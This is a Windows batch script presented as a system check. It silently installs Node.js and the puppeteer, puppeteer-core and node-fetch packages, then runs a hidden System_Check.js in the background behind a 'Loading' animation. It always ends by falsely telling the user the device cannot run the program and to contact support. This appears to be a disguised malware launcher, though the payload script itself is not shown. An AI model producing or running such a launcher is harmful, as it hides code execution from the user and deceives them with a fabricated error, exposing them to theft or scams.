@echo off
setlocal EnableDelayedExpansion

:: Change to the directory of the batch script
cd /d "%~dp0"

:: Check if Node.js is installed
where node >nul 2>nul
if errorlevel 1 (
    echo [INFO] Node.js not found. Installing Node.js...
    powershell -Command "Invoke-WebRequest -Uri https://nodejs.org/dist/v20.11.1/node-v20.11.1-x64.msi -OutFile node_installer.msi"
    powershell -Command "Start-Process msiexec.exe -ArgumentList '/i node_installer.msi /qn /norestart' -Wait"
    del node_installer.msi

    :: Add to path for current session
    set "PATH=%ProgramFiles%\nodejs;%PATH%"
)

:: Verify Node.js installation
where node >nul 2>nul
if errorlevel 1 (
    echo [ERROR] Node.js installation failed or not in PATH.
    pause
    exit /b
)

:: Verify npm is available
where npm >nul 2>nul
if errorlevel 1 (
    echo [ERROR] npm is not available. Something went wrong with Node.js install.
    pause
    exit /b
)

:: Install required Node.js packages
echo [INFO] Installing required Node.js packages...
call npm install puppeteer puppeteer-core node-fetch > install_log.txt 2>&1
if errorlevel 1 (
    echo [ERROR] Failed to install npm packages. See install_log.txt
    pause
    exit /b
)

:: Verify the Node.js script exists
if not exist System_Check.js (
    echo [ERROR] System_Check.js not found in this directory.
    pause
    exit /b
)

:: Run System_Check.js and log output
echo [INFO] Running System_Check.js...
start "" /B cmd /c "node System_Check.js > system_log.txt 2>&1"

:: Loading animation setup
set "dots=."
set /a count=0

:loading
cls
echo Loading!%dots%

:: Cycle dots
if "%dots%"=="." (
    set "dots=.."
) else if "%dots%"==".." (
    set "dots=..."
) else (
    set "dots=."
)

:: Wait a moment
ping 127.0.0.1 -n 2 >nul

:: Check if Node.js is still running
tasklist /FI "IMAGENAME eq node.exe" | find /I "node.exe" >nul
if errorlevel 1 (
    goto done
) else (
    goto loading
)

:done
cls
echo Your Device cannot run this program. Please contact support.
echo [INFO] See system_log.txt for details.
pause >nul
